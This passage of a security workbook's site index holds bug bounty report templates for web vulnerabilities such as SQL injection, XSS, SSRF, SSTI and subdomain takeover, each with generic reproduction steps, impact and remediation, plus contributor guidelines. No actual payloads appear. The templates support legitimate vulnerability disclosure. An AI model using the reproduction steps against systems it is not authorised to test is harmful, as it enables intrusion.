vulnerability targets web applications that dynamically reference external scripts. The perpetrator\u2019s goal is to exploit the referencing function in an application to upload malware (e.g., backdoor shells) from a remote URL located within a different domain.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Change the value of [Vulnerable Parameter] to the above payload.</li> <li>Reload the page.</li> <li>Observe as the payload executes.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#impact","title":"Impact","text":"<p>Using remote file inclusion (RFI), an attacker can cause the web application to include a remote file. This is possible for web applications that dynamically include external files or scripts. Potential web security consequences of a successful RFI attack range from sensitive information disclosure and cross-site scripting (XSS) to remote code execution and, as a final result, full system compromise.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#remediation","title":"Remediation","text":"<ul> <li>Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters.</li> <li>After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.</li> <li>If you need to include local files in your website or web application code, use a whitelist of allowed file names and locations. Make sure that none of these files can be replaced by the attacker using file upload functions.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/","title":"RXSS (Reflected cross-site scripting)","text":""},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#rxss-reflected-cross-site-scripting","title":"RXSS (Reflected cross-site scripting)","text":""},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#vulnerability-name","title":"Vulnerability Name","text":"<p>Reflected XSS at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#vulnerability-description","title":"Vulnerability Description","text":"<p>Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.</p> <p>If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Add the payload above in [Vulnerable Parameter] value.</li> <li>Reload the page.</li> <li>Observe as you should get an alert.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#impact","title":"Impact","text":"<ul> <li>Gain access to users cookies, session IDs, passwords, private messages, etc.</li> <li>Read and access the content of a page for any attacked user and therefore all the information displayed to the user.</li> <li>Compromise the content shown to the user.</li> <li>Inject Trojan functionality into the website.</li> </ul> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#remediation","title":"Remediation","text":"<p>To keep yourself safe from RXSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.</p> <ul> <li>Filter input on arrival.</li> <li>Encode data on output.</li> <li>Use appropriate response headers.</li> <li>Content Security Policy.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/rxss-reflected-cross-site-scripting/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/cross-site-scripting/reflected</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/","title":"SQL Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#sql-injection","title":"SQL Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>SQL Injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. This information may include any number of items, including sensitive company data, user lists or private customer details.</p> <p>In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#poc","title":"**POC**","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#impact","title":"Impact","text":"<p>There are a number of things an attacker can do when exploiting an SQL injection on a vulnerable website. Usually, it depends on the privileges of the user the web application uses to connect to the database server. By exploiting an SQL injection vulnerability, an attacker can:</p> <ul> <li>Add, delete, edit or read content in the database</li> <li>Read source code from files on the database server</li> <li>Write files to the database server</li> </ul> <p>It all depends on the capabilities of the attacker.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#remediation","title":"Remediation","text":"<ul> <li>Ensure that when a user\u2019s input is added to a backend SQL query, it is not string appended but placed into the specific SQL parameter. </li> <li>Create character ranges (i.e., Numeric, alpha, alphanumeric, alphanumeric with specific characters) and ensure that each input is restricted to the minimum length whitelist necessary. </li> <li>Disallow common injection characters and unnecessary or bad encoding schemas. </li> <li>Ensure that proper logging is taking place and is being reviewed, and any malicious traffic which generates an alert is promptly throttled and eventually blacklisted.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sql-injection/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/sql-injection</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/","title":"SSI Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#ssi-injection","title":"SSI Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>SSI Injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>SSI (Server Side Include) Injection is a attack technique where the web application fails to validate and sanitize the user-supplied input data before they are included into the server side. It allows an attacker to send any arbitrary code into the web application which will be executed locally by the server.</p> <p>The Server-Side Includes attack allows the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary codes remotely</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#impact","title":"Impact","text":"<p>By leveraging this attack vector, the attacker can get the access to sensitive information such as credentials, API keys, etc. and attacker can execute shell commands on server as well. The SSI injection payloads (directives) are injected in the input field of the web application and they are sent to the web server. The web server parses and executes those directives. then, the attack result will be shown on the web application when the user visits that page.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#remediation","title":"Remediation","text":"<ul> <li>Disable the SSI execution wherever not required only enable specific directives that are required for a specific page and disable others </li> <li>HTML entity encoding should be applied on all user input before passing to a page.</li> <li>Only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable SSI metacharacter, should be rejected</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssi-injection/#reference","title":"Reference","text":"<ul> <li>https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection</li> <li>https://portswigger.net/kb/issues/00101100_ssi-injection</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/","title":"SSRF (Server-Side Request Forgery)","text":""},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#ssrf-server-side-request-forgery","title":"SSRF (Server-Side Request Forgery)","text":""},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#vulnerability-name","title":"Vulnerability Name","text":"<p>SSRF at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#vulnerability-description","title":"Vulnerability Description","text":"<p>SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).</p> <p>As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Log in to the application.</li> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Alter the value of [Vulnerable Parameter] and send the request.</li> <li>Observe the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#impact","title":"Impact","text":"<p>This vulnerability can often result in unauthorized actions or access to data within the organization. This can be in the vulnerable application, or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.</p> <p>An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks. these can appear to originate from the organization hosting the vulnerable application.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#remediation","title":"Remediation","text":"<ul> <li>Segment remote resource access functionality in separate networks to reduce the impact of SSRF</li> <li>Enforce \u201cdeny by default\u201d firewall policies or network access control rules to block all but essential intranet traffic.</li> <li>Sanitize and validate all client-supplied input data</li> <li>Enforce the URL schema, port, and destination with a positive allow list</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ssrf-server-side-request-forgery/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/ssrf</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/","title":"Subdomain Takeover","text":""},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#subdomain-takeover","title":"Subdomain Takeover","text":""},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#vulnerability-name","title":"Vulnerability Name","text":"<p>Subdomain Takeover of [Subdomain URL]</p>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#vulnerability-description","title":"Vulnerability Description","text":"<p>A subdomain takeover occurs when an attacker gains control over a subdomain of a target domain. Typically, this happens when the subdomain has a canonical name (CNAME) in the Domain Name System (DNS), but no host is providing content for it. </p> <p>This can happen because either a virtual host hasn't been published yet or a virtual host has been removed. An attacker can take over that subdomain by providing their own virtual host and then hosting their own content for it.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Subdomain URL].</li> <li>Observe as this URL shows [Specific Error].</li> <li>The provider/engine for our target application is [Provider Name].</li> <li>Since [Provider Name] does not perform any automated fingerprint check, we can try to register for this subdomain. </li> <li>Observe we are able to takeover [Subdomain URL] by registering it without any authentication.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#impact","title":"Impact","text":"<p>Attacker can potentially read cookies set from the main domain, perform cross-site scripting, or circumvent content security policies, thereby enabling them to capture protected information (including logins) or send malicious content to unsuspecting users.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#remediation","title":"Remediation","text":"<ul> <li>Define standard processes for provisioning and deprovisioning hosts. Do all steps as closely together as possible.</li> <li>Put pressure on hosting vendors to close gaps; ask how they verify that someone claiming a virtual host actually has a legitimate claim to the domain name. Work within your organization to make this part of the vendor qualification process.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/subdomain-takeover/#reference","title":"Reference","text":"<ul> <li>https://developer.mozilla.org/en-US/docs/Web/Security/Subdomain_takeovers</li> <li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/","title":"SXSS (Stored cross-site scripting)","text":""},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#sxss-stored-cross-site-scripting","title":"SXSS (Stored cross-site scripting)","text":""},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#vulnerability-name","title":"Vulnerability Name","text":"<p>Stored XSS at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#vulnerability-description","title":"Vulnerability Description","text":"<p>A Persistent XSS attack is possible when a website or web application stores user input and later serves it to other users. Stored XSS allows potential attackers to inject client-side scripts directly onto target servers. This is not just a single user issue, however, it affects everyone who has access to these servers. Once attackers find a vulnerability in the web application, they can inject their script and wait for an unsuspecting target to fall into their trap.</p> <p>The injected script is permanently stored on the now infected servers and allows the attacker to set their targets up to receive the malicious script from the servers when they make a request.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL] from account one.</li> <li>Add the above payload in [Vulnerable Parameter] value.</li> <li>Go to the vulnerable location from account two.</li> <li>Observe as you get an alert.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#impact","title":"Impact","text":"<ul> <li>Gain access to users cookies, session IDs, passwords, private messages, etc</li> <li>Read and access the content of a page for any attacked user and therefore all the information displayed to the user</li> <li>Compromise the content shown to the user</li> </ul> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#remediation","title":"Remediation","text":"<p>To keep yourself safe from RXSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.</p> <ul> <li>Filter input on arrival.</li> <li>Encode data on output.</li> <li>Use appropriate response headers.</li> <li>Content Security Policy.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/sxss-stored-cross-site-scripting/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/cross-site-scripting/stored</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/","title":"SSTI (Server-Side Template Injection)","text":""},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#ssti-server-side-template-injection","title":"SSTI (Server-Side Template Injection)","text":""},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>Server-side template injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.</p> <p>As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#impact","title":"Impact","text":"<p>At the severe end of the scale, an attacker can potentially achieve remote code execution, taking full control of the back-end server and using it to perform other attacks on internal infrastructure.</p> <p>Even in cases where full remote code execution is not possible, an attacker can often still use server-side template injection as the basis for numerous other attacks, potentially gaining read access to sensitive data and arbitrary files on the server.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#remediation","title":"Remediation","text":"<ul> <li>One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a \"logic-less\" template engine, such as Mustache, unless absolutely necessary.</li> <li>Separating the logic from the presentation as much as possible can greatly reduce your exposure to the most dangerous template-based attacks.</li> <li>Another measure is to only execute users' code in a sandboxed environment where potentially dangerous modules and functions have been removed altogether.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/template-injection/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/server-side-template-injection#how-to-prevent-server-side-template-injection-vulnerabilities</li> <li>https://portswigger.net/research/server-side-template-injection</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/","title":"Unrestricted File Upload","text":""},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#unrestricted-file-upload","title":"Unrestricted File Upload","text":""},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#vulnerability-name","title":"Vulnerability Name","text":"<p>Unrestricted File Upload in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#vulnerability-description","title":"Vulnerability Description","text":"<p>File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.</p> <p>In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Log in to the application.</li> <li>Go to [Affected URL].</li> <li>Upload [Unrestricted File].</li> <li>Observe as the file is uploaded.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#impact","title":"Impact","text":"<p>In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as <code>.php</code> and <code>.jsp</code>) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server.</p> <p>If the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name. If the server is also vulnerable to directory traversal, this could mean attackers are even able to upload files to unanticipated locations.</p> <p>Failing to make sure that the size of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#remediation","title":"Remediation","text":"<ul> <li>Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.</li> <li>Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (<code>../</code>).</li> <li>Rename uploaded files to avoid collisions that may cause existing files to be overwritten.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/unrestricted-file-upload/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/file-upload#how-to-prevent-file-upload-vulnerabilities</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/","title":"Use of Default Credentials","text":""},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#use-of-default-credentials","title":"Use of Default Credentials","text":""},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#vulnerability-name","title":"Vulnerability Name","text":"<p>Default Credentials working at [Login Portal]</p>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#vulnerability-description","title":"Vulnerability Description","text":"<p>Many web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.</p> <p>Additionally, when new users are created on the applications, these may have predefined passwords set. These could either be generated automatically by the application, or manually created by staff. In both cases, if they are not generated in a secure manner, the passwords may be possible for an attacker to guess.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Enter these default credentials to log in: <code>Username Password</code>.</li> <li>Observe as the default credentials are allowing log in into the application.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#impact","title":"Impact","text":"<p>This vulnerability allows unauthorized individuals to gain easy access to a system, device, or application with minimal effort. This security flaw poses a significant risk, potentially resulting in data breaches, unauthorized system control, and compromised user privacy.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#remediation","title":"Remediation","text":"<ul> <li>By eliminating commonly known or easily guessable username and password combinations, organizations bolster their defenses against potential attacks, such as brute force and credential stuffing. </li> <li>Additionally, the adoption of strong, unique credentials underscores a commitment to security, fostering a culture of best practices and diligence among both users and administrators.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/use-of-default-credentials/#reference","title":"Reference","text":"<ul> <li>https://cwe.mitre.org/data/definitions/1392.html</li> <li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials</li> </ul>"},{"location":"Contribution/","title":"Contribution","text":""},{"location":"Contribution/#contribution","title":"Contribution","text":"<p>The SecurityBoat Workbook is an open-source project which is actively maintained and constantly evolving. We welcome contributions in the form of additions, corrections, or updates to the resources and we have implemented a process for these contributions.</p>"},{"location":"Contribution/#want-to-add-or-update-a-sectionpage","title":"Want to add or update a section/page?","text":"<p>Before adding a new section or note, please first search the knowledge base to ensure it doesn't already exist. If it is not present, visit the discussion board to see if there are any existing discussions about the topic. If there are none, initiate a new discussion and include all the necessary information below:</p>"},{"location":"Contribution/#format-of-discussion","title":"Format of discussion","text":""},{"location":"Contribution/#title","title":"Title","text":"<ul> <li>A good title should be a short, one-sentence description, contain all relevant information.</li> </ul> Example Update to the XYZ resource in ABC page Clear Addition of XYZ resource in ABC page Clear Missing information in the docs Unclear XYZ Section not found Unclear Help Useless"},{"location":"Contribution/#description","title":"Description","text":"<ul> <li>When requesting updates or additions to the knowledge base, please provide a clear and brief summary of what needs to change and explain why.</li> <li>Please address only one specific issue at a time to simplify tracking and updating. </li> <li>Please clearly describe the problem to help us understand the needed improvements. </li> <li>Please include direct, anchored links to the relevant documentation sections for easy reference.</li> </ul>"},{"location":"Contribution/#found-a-typo","title":"Found a typo?","text":"<ul> <li>Please submit a pull request with the correction.</li> </ul>"},{"location":"Contribution/#submitting-a-pull-request","title":"Submitting a pull request","text":"<ul> <li>This knowledge base is developed using Mkdocs Material.</li> <li>If you're interested in contributing, you can submit a draft pull request by forking this repository.</li> <li>You can test the changes by either running the server locally or making edits directly to Markdown files from GitHub.</li> </ul>"},{"location":"Contribution/#running-the-site-locally","title":"Running the site locally","text":"<p>To run the site locally, follow these steps:</p> <ul> <li>Fork the repository.</li> <li>Clone the forked repository locally in the system.</li> <li>Run the below command to install mkdocs-material and required extensions: <pre><code>pip install mkdocs-material\n</code></pre> <pre><code>pip install mkdocs-exclude\n</code></pre> <pre><code>pip install mkdocs-pdf\n</code></pre></li> <li>Make sure you have a proper IDE installed. We will go with VS-Code. Run the following command to open VS-Code with the workbook files: <pre><code>cd workbook\n</code></pre> <pre><code>code .\n</code></pre></li> <li>Run the following command to run the site locally: <pre><code>mkdocs-serve\n</code></pre></li> <li>Make changes and check them in the site running locally. Either use GitHub Desktop or generate a new SSH key to use for github authentication to commit and sync the changes to your forked workbook repository. You can now sumbit a pull request.</li> </ul> <p>We appreciate you for following the guide and providing valuable feedback the knowledge base.</p> <p>Issues, discussions, and comments are forever</p> <p>Please note that everything you write is permanent and will remain for everyone to read \u2013 forever. Therefore, please always be nice and constructive, follow our contribution guidelines, and comply with our Code of Conduct. Please read rights and responsibilities page.</p>"},{"location":"Contribution/Contributions/","title":"Contributors","text":""},{"location":"Contribution/Contributions/#contributors","title":"Contributors","text":"Ninad Mathpati Shubham Chaskar Sunil Kande Gaurav Popalghat Sanyam Chawla Rushikesh Ambuskar Gaurav Ahire Mukul Trivedi Jyotiranjan Mohapatra Varad Magare Himanshu Gupta Tejas Shingade"},{"location":"Contribution/rights_and_responsibilities/","title":"Rights and responsibilities","text":""},{"location":"Contribution/rights_and_responsibilities/#rights-and-responsibilities","title":"Rights and responsibilities","text":"<p>As maintainers, we are entrusted with the responsibility to moderate communication within our community, including the authority to close, remove, reject, or edit issues, discussions, comments, commits, and to block users who do not align with our contribution guidelines and our Code of Conduct. This role requires us to be actively involved in maintaining the integrity and positive atmosphere of our community. Upholding these standards decisively ensures a respectful and inclusive environment for all members.</p>"},{"location":"Contribution/rights_and_responsibilities/#code-of-conduct","title":"Code of Conduct","text":"<p>Our Code of Conduct outlines the expectation for all community members to treat one another with respect, employing inclusive and welcoming language. Our commitment is to foster a positive and supportive environment, free of inappropriate, offensive, or harmful behavior.</p> <p>We take any violations seriously and will take appropriate action in response to uphold these values.</p>"},{"location":"Contribution/rights_and_responsibilities/#incomplete-issues-and-duplicates","title":"Incomplete issues and duplicates","text":"<ul> <li> <p>Closing incomplete issues:   We reserve the right to close issues lacking essential information. Issues can be reopened once the missing information has been provided.</p> </li> <li> 